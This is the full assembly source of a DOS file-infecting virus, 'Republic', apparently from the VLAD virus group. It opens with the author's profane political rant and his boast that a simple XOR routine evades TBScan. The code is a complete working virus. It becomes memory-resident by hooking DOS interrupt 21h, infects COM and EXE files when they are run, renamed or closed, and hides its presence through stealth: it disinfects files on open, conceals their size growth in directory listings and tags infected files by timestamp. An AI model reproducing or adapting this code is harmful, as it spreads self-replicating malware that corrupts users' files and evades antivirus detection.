
;               REPUBLIC!
;               +-------+             Qark/VLAD
;
;
; This virus is named because I (and metabolis) support a republic for 
; Australia.  Fuck the Union Jack off from our flag... we want something
; Australian in there... and an Australian head of state not some pommy
; bitch Queen and her corgis.
;
; A funny thing:  I wrote a full-on MTE/TPE/DAME type polymorphic engine
; for this virus, but TBScan found it every time!  But when i do the
; shitty XOR routine that's at the end, TBScan hardly finds anything!
; TBAV can be proud of it's capabilites with polymorphism, but for
; basic encryption it's a big thumbs down...
;
;       Stats:
;               -       Disinfect on open, Infect on close.
;               -       No directory filesize change
;               -       No findfirst filesize change
;               -       Some anti-debugging features
;
; Anyway, this is my best virus so far.  I've come a fair way since broken,
; fucked up brother in VLAD#1 I'm sure you'll agree.  I wrote this virus
; a few months ago and am better than this already.
;
; As always, the A86 assembler is my favourite :)


                org     0


        db      0beh            ;MOV SI,xxxx
delta   dw      offset enc_start + 100h
        cld
        call    encrypt
enc_start:
        push    cs
        pop     ds                              ;DS=CS
        sub     si,offset enc_end               ;The polymorphism is done.
        
        
        
        mov     word ptr [si+offset quit],20cdh
quit:
        mov     word ptr [si+offset quit],44c7h ;The bytes changed.


        push    es
        push    si
        
        ;If I don't get a feed soon, I'll start to fade...

        mov     ax,0FEEDh               ;Feed ?
        int     21h

        cmp     ax,0FADEh               ;Yes...
        je      resident                ;Fade...

        mov     ax,es
        dec     ax
        mov     ds,ax

        cmp     byte ptr [0],'Z'
        jne     resident

        sub     word ptr [3],160        ;2560 bytes of memory.
        sub     word ptr [12h],160      ;2560 bytes off TOM.
        
        mov     bx,word ptr [12h]       ;Read in the TOM.

        push    cs
        pop     ds                      ;DS=CS

        xor     ax,ax                   ;ES=0  (Vector Table)
        mov     es,ax

        mov     ax,word ptr es:[132]    ;Get int21h.
        mov     word ptr [si+offset i21],ax

        mov     ax,word ptr es:[134]    ;Get int21h segment.
        mov     word ptr [si+offset i21+2],ax

        mov     es,bx                   ;ES=Segment to store virus.

        xor     di,di                   ;Zero in memory.
        mov     cx,offset length        ;The size of the virus.
        rep     movsb                   ;Move the virus.

        xor     ax,ax
        mov     ds,ax                   ;ES=0 (Vector Table)

        mov     word ptr [132],offset infection
        mov     [134],bx                ;BX=Virus Seg I hope!
        
resident:

        pop     si                      ;SI=IP (Virus start)
        pop     es                      ;ES=PSP

        push    cs
        pop     ds

        cmp     byte ptr [si+offset com_exe],1
        je      exe_exit

        mov     ax,word ptr [si+offset old3]
        mov     [100h],ax
        mov     al,byte ptr [si+offset old3+2]
        mov     [102h],al

        push    es
        pop     ds

        call    zero_all
        mov     ax,100h
        jmp     ax
        
Exe_Exit:

        mov     ax,es                   ;ES=PSP
        add     ax,10h                  ;EXE file start.
        add     word ptr [si+jump+2],ax
        
        call    zero_all
        
        mov     sp,word ptr [si+offset orig_sp]
        add     ax,word ptr [si+offset orig_ss] ;Fix SS with AX.
        mov     ss,ax
        
        push    es
        pop     ds
        
        
        db      0eah
        jump    dd      0
        
        Message         db      'Go the Republic! '
                        db      'Fuck off Royal Family!',0
        Creator         db      'Qark/VLAD of the Republic of Australia',0

Infection:

        push    ax
        xchg    al,ah
        
        cmp     ax,004bh                ;Exec.  Don't infect on 4B01h because
        je      test_inf                ;debug will find it then.

        cmp     al,43h                  ;Chmod.
        je      test_inf
        
        cmp     al,56h                  ;Rename.
        je      test_inf
        
        cmp     al,6ch                  ;Open.
        je      dis_inf
        
        cmp     al,3dh                  ;Open
        je      dis_inf

        cmp     al,11h                  ;FCB find.
        je      dir_listing
        
        cmp     al,12h                  ;Dir listing in progress.
        je      dir_listing

        cmp     al,4eh                  ;Find first.
        je      find_file
        
        cmp     al,4fh                  ;Find_next.
        je      find_file
        
        cmp     al,3eh                  ;Close.
        je      end_infect

        pop     ax

        cmp     ax,0FEEDh
        je      res_check               ;Testing for installation ?

jump_exit:

        jmp     jend                    ;Exit TSR

res_check:
        mov     ax,0FADEh               ;Return parameter.
        iret

dir_listing:
        jmp     dir_stealth
find_file:
        jmp     search_stealth
dis_inf:
        jmp     full_stealth            ;Disinfect on the fly.
end_infect:
        jmp     close_infect

jump2_exit:
        jmp     far_pop_exit            ;Just an exit.

test_inf:

        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    ds
        push    es
        
        call    check_name

        jc      jump2_exit

        mov     ax,3d00h        ;Open readonly.
        mov     dx,di           ;DX=DI=Offset length
        call    int21h

        jc      jump2_exit

        mov     bx,ax

        call    get_sft

                                        ;Test for infection.
        mov     ax,word ptr es:[di+0dh] ;File time into AX from SFT.
        mov     word ptr es:[di+2],2    ;Bypass Read only attribute.
        and     ax,1f1fh                ;Get rid of the shit we don't need.
        cmp     al,ah                   ;Compare the seconds with minutes.
        je      jump2_exit

Handle_Infection:

        push    cs
        pop     es                      ;ES=CS

                                        ;Read the File header in to test
                                        ;for EXE or COM.
        mov     ah,3fh                  ;Read from file.
        mov     cx,1ch                  ;1C bytes.
        call    int21h                  ;DX=Offset length from file open.
                                        ;We don't need the filename anymore
                                        ;so use that space as a buffer.

        mov     si,dx                   ;SI=DX=offset length.
        mov     di,offset header
        mov     cx,18h
        rep     movsb                   ;Move header to header.

        
        mov     si,dx                   ;SI=DX=Offset of length.

        mov     ax,word ptr [si]        ;=Start of COM or EXE.
        add     al,ah                   ;Add possible MZ.
        cmp     al,167                  ;Test for MZ.
        je      exe_infect
        jmp     com_infect

EXE_infect:

        mov     byte ptr com_exe,1      ;Signal EXE file.

        cmp     word ptr [si+1ah],0     ;Test for overlays.
        jne     exe_close_exit          ;Quick... run!!!

        push    si                      ;SI=Offset of header

        add     si,0eh                  ;SS:SP are here.
        mov     di,offset orig_ss
        movsw                           ;Move them!
        movsw

        mov     di,offset jump          ;The CS:IP go in here.

        lodsw                           ;ADD SI,2 - AX destroyed.

        movsw
        movsw                           ;Move them!

        pop     si

        call    get_sft                 ;ES:DI = SFT for file.

        mov     ax,word ptr es:[di+11h] ;File length in DX:AX.
        mov     dx,word ptr es:[di+13h]
        mov     cx,16                   ;Divide by paragraphs.
        div     cx

        sub     ax,word ptr [si+8]      ;Subtract headersize.

        mov     word ptr delta,dx       ;Initial IP.
        
        add     delta,offset enc_start  ;Fix for polymorphics.

        mov     word ptr [si+14h],dx    ;IP in header.
        mov     word ptr [si+16h],ax    ;CS in header.

        add     dx,offset stack_end     ;Fix SS:SP for file.

        mov     word ptr [si+0eh],ax    ;We'll make SS=CS
        mov     word ptr [si+10h],dx    ;SP=IP+Offset of our buffer.

        mov     ax,word ptr es:[di+11h] ;File length in DX:AX.
        mov     dx,word ptr es:[di+13h]

        add     ax,offset length        ;Add the virus length on.
        adc     dx,0                    ;32bit

        mov     cx,512                  ;Divide by pages.
        div     cx

        and     dx,dx
        jz      no_page_fix

        inc     ax                              ;One more for the partial
                                                ;page!
no_page_fix:

        mov     word ptr [si+4],ax              ;Number of pages.
        mov     word ptr [si+2],dx              ;Partial page.

        mov     word ptr es:[di+15h],0          ;Lseek to start of file.

        call    get_date                        ;Save the old time/date.

        mov     ah,40h                          ;Write header to file.
        mov     dx,si                           ;Our header buffer.
        mov     cx,1ch                          ;1CH bytes.
        call    int21h

        jc      exe_close_exit

        mov     ax,4202h                        ;End of file.  Smaller than
                                                ;using SFT's.
        xor     cx,cx                           ;Zero CX
        cwd                                     ;Zero DX (If AX < 8000H then
                                                ;CWD moves zero into DX)
        call    int21h

        call    enc_setup                       ;Thisll encrypt it and move
                                                ;it to the end of file.
exe_close_exit:

        jmp     com_close_exit

com_infect:

        mov     byte ptr com_exe,0      ;Flag COM infection.

        mov     ax,word ptr [si]        ;Save COM files first 3 bytes.
        mov     word ptr old3,ax
        mov     al,[si+2]
        mov     byte ptr old3+2,al

        call    get_sft                 ;SFT is at ES:DI

        mov     ax,es:[di+11h]          ;AX=File Size

        cmp     ax,64000
        ja      com_close_exit          ;Too big.

        cmp     ax,1000
        jb      com_close_exit          ;Too small.

        push    ax                      ;Save filesize.

        mov     newoff,ax               ;For the new jump.
        sub     newoff,3                ;Fix the jump.

        mov     word ptr es:[di+15h],0  ;Lseek to start of file :)

        call    get_date                ;Save original file date.

        mov     ah,40h
        mov     cx,3
        mov     dx,offset new3          ;Write the virus jump to start of
        call    int21h                  ;file.

        pop     ax                      ;Restore file size.

        jc      com_close_exit          ;If an error occurred... exit.

        mov     word ptr es:[di+15h],ax ;Lseek to end of file.

        add     ax,offset enc_start + 100h    ;File size + 100h.
        mov     word ptr delta,ax       ;The delta offset for COM files.

        call    enc_setup

com_close_exit:

        mov     ah,3eh
        call    int21h

far_pop_exit:

        pop     es
        pop     ds
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax

jend:
        db      0eah                    ;Opcode for jmpf
        i21     dd      0

int21h  proc    near                    ;Our int 21h

        pushf
        call    dword ptr cs:[i21]
        ret
int21h  endp

close_infect:
        cmp     bl,4
        ja      good_handle    
        pop     ax
        jmp     jend

Good_Handle:

        push    bx                      ;Save the original registers.
        push    cx
        push    dx
        push    si
        push    di
        push    ds
        push    es

        call    get_sft                 ;ES:DI = SFT
        mov     ax,word ptr es:[di+0dh] ;AX=Time
        and     ax,1f1fh                ;Shit we don't need.
        cmp     al,ah                   ;AL=AH means infected.
        je      far_pop_exit

        mov     dx,offset length
        push    cs
        pop     ds

        mov     word ptr es:[di+2],2             ;Read/Write mode.
        mov     word ptr es:[di+15h],0           ;Zero file pointer.
        mov     word ptr es:[di+17h],0           ;Zero file pointer.
        add     di,28h                  ;ES:DI=Extension
        cmp     word ptr es:[di],'OC'
        je      close_com
        cmp     word ptr es:[di],'XE'
        jne     far_pop_exit
Close_Exe:
        inc     di
        inc     di
        cmp     byte ptr es:[di],'E'
        jne     far_pop_exit
        jmp     handle_infection

Close_Com:

        cmp     byte ptr es:[di+2],'M'
        jne     far_pop_exit
        jmp     handle_infection

;-------

Full_Stealth:
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    ds
        push    es

        cmp     al,6ch
        jne     stealth_6c
        
        mov     dx,si

stealth_6c:
        call    check_name
        jnc     do_stealth
Stealth_end:
        jmp     far_pop_exit

Do_Stealth:

        mov     ax,3d00h
        mov     dx,di
        call    int21h
        jc      stealth_end

        mov     bx,ax                   ;BX=filehandle
        call    get_sft
                                        ;ES:DI=SFT
        
        mov     ax,word ptr es:[di+0dh] ;File time into AX from SFT.
        mov     word ptr es:[di+2],2    ;Bypass Read only attribute.
        and     ax,1f1fh                ;Get rid of the shit we don't need.
        cmp     al,ah                   ;Compare the seconds with minutes.
        jne     stealth_end             ;Not infected...


        mov     ax,word ptr es:[di+11h] ;File size.
        mov     dx,word ptr es:[di+13h]

        push    dx
        push    ax

        sub     ax,1ch                  ;Header+time+date = 1ch
        sbb     dx,0
        mov     word ptr es:[di+15h],ax ;File pointer.
        mov     word ptr es:[di+17h],dx

        mov     ah,3fh
        mov     dx,offset header        ;Read in header.
        mov     cx,1ch
        call    int21h

        pop     ax
        pop     dx                      ;DX:AX=length of file

        sub     ax,offset length        ;EOF - length.
        sbb     dx,0
        mov     word ptr es:[di+15h],ax
        mov     word ptr es:[di+17h],dx

        mov     ah,40h                  ;Truncate virus off.
        xor     cx,cx
        call    int21h
        jc      stealth_end

        mov     word ptr es:[di+15h],0  ;Start of file
        mov     word ptr es:[di+17h],0

        mov     ah,40h
        mov     dx,offset header
        mov     cx,18h
        call    int21h                  ;Write original header back.

        mov     cx,word ptr time
        mov     dx,word ptr date
        mov     ax,5701h                ;Put original time/date back.
        call    int21h

        mov     ah,3eh                  ;Close file.
        call    int21h

        jmp     stealth_end

Check_Name      proc    near
;Entry:
;DS:DX=Filename
;
;Exit:
;Carry if bad name.
;DS=ES=CS
;AX is fucked.
;SI = File Extension Somewhere.
;DI = Offset length.


        mov     si,dx                   ;DS:SI = Filename.

        push    cs
        pop     es                      ;ES=CS

        mov     ah,60h                  ;Get qualified filename.
        mov     di,offset length        ;DI=Buffer for filename.
        call    int21h                  ;This converts it to uppercase too!

                                        ;CS:LENGTH = Filename in uppercase
                                        ;with path and drive.  Much easier
                                        ;to handle now!
        push    cs
        pop     ds                      ;DS=CS

        mov     si,di                   ;SI=DI=Offset Length

        cld                             ;Forward!

find_ascii_z:

        lodsb
        cmp     al,0
        jne     find_ascii_z

        sub     si,4                    ;Points to the file extension. 'EXE'

        lodsw                           ;Mov AX,DS:[SI]

        cmp     ax,'XE'                 ;The 'EX' out of 'EXE'
        jne     test_com

        lodsb                           ;Mov AL,DS:[SI]

        cmp     al,'E'                  ;The last 'E' in 'EXE'
        jne     Bad_Name

        jmp     do_file                 ;EXE-file

test_com:

        cmp     ax,'OC'                 ;The 'CO' out of 'COM'
        jne     Bad_Name

        lodsb                           ;Mov AL,DS:[SI]

        cmp     al,'M'
        je      do_file                 ;COM-file

Bad_Name:
        stc
        ret

do_file:
        clc
        ret
Check_Name      endp


Search_Stealth:

        pop     ax              ;Restore AX.

        call    int21h
        jc      end_search

        push    es
        push    bx
        push    si

        mov     ah,2fh
        call    int21h

        mov     si,bx

        mov     bx,word ptr es:[si+16h]
        and     bx,1f1fh
        cmp     bl,bh
        jne     search_pop                         ;Is our marker set ?

        sub     word ptr es:[si+1ah],offset length ;Subtract the file length.
        sbb     word ptr es:[si+1ch],0

search_pop:

        pop     si
        pop     bx
        pop     es
        clc

end_search:
        retf     2                      ;This is the same as an IRET
                                        ;except that the flags aren't popped
                                        ;off so our Carry Remains set.

Dir_Stealth:

        ;This bit means that wen you do a 'dir' there is no change in
        ;file size.

        pop     ax

        call    int21h                          ;Call the interrupt
        cmp     al,0                            ;straight off.
        jne     end_of_dir

        push    es
        push    ax                              ;Save em.
        push    bx
        push    si

        mov     ah,2fh                          ;Get DTA address.
        call    int21h

        mov     si,bx

        cmp     byte ptr es:[si],0ffh           ;Extended FCB ?
        jne     not_extended

        add     si,7                            ;Add the extra's.

not_extended:

        mov     bx,word ptr es:[si+17h]         ;Move time.
        and     bx,1f1fh
        cmp     bl,bh
        jne     dir_pop                         ;Is our marker set ?

        sub     word ptr es:[si+1dh],offset length ;Subtract the file length.
        sbb     word ptr es:[si+1fh],0

dir_pop:

        pop     si
        pop     bx
        pop     ax
        pop     es

end_of_dir:
        
        iret

Get_Date        proc    near
        mov     ax,5700h                ;Get Date/Time.
        call    int21h
        mov     word ptr time,cx
        mov     word ptr date,dx

        ret

Get_date        endp

Set_Marker      proc    near
        
        mov     cx,time
        mov     al,ch
        and     al,1fh
        and     cl,0e0h
        or      cl,al
        mov     dx,date
        mov     ax,5701h
        call    int21h

        ret

Set_marker      endp

Enc_Setup       proc    near

        push    cs
        pop     es

        in      al,40h
        mov     byte ptr cs:cipher,al

        xor     si,si
        mov     di,offset length        ;Offset of our buffer.
        mov     cx,offset length        ;Virus Length.
        rep     movsb                   ;Move the virus up in memory for
                                        ;encryption.
        
        mov     si,offset length + offset enc_start

        call    encrypt                 ;Encrypt virus.

        mov     ah,40h                  ;Write virus to file
        mov     dx,offset length        ;Buffer for encrypted virus.
        mov     cx,offset length        ;Virus length.
        call    int21h

        call    set_marker              ;Mark file as infected.

        ret

Enc_setup       endp

Get_SFT Proc    Near
;Entry:  BX=File Handle.
;Exit:   ES:DI=SFT.
        push    bx

        mov     ax,1220h        ;Get Job File Table Entry.  The byte pointed
        int     2fh             ;at by ES:[DI] contains the number of the
                                ;SFT for the file handle.

        xor     bx,bx
        mov     bl,es:[di]      ;Get address of System File Table Entry.
        mov     ax,1216h
        int     2fh

        pop     bx

        ret

Get_SFT EndP

Zero_All        proc    near
;Zero's everything cept AX.

        xor     bx,bx                   ;Zero BX
        mov     cx,bx
        mov     dx,bx
        mov     di,bx
        
        ret
Zero_All        endp

        
        New3    db      0e9h                    ;The jump for the start of
        Newoff  dw      0                       ;COM files.
        orig_ss dw      0
        orig_sp dw      0
        com_exe db      0
        old3    db      0cdh,20h,90h



enc_end:                                ;Encryption ends here.

; QaRK's |<-RaD TBSCaN eVaDeR!!!!!111

; Works every time :)

encrypt proc    near

;Si = enc_start
        mov     cx,offset enc_end - offset enc_start
        db      0b0h            ;=MOV AL,xx                        
        cipher  db      0
enc_loop:
        ror     al,1
        neg     al
        xor    cs:[si],al       ;<--- Whoah! Never guess this was encryption!
        add     al,al
        inc     si
        loop    enc_loop
        ret

Encrypt endp

        header  db      18h dup (0)             ;rewrite this
        time    dw      0                       ;restore this
        date    dw      0

length  db      200 dup (0)
stack_end:

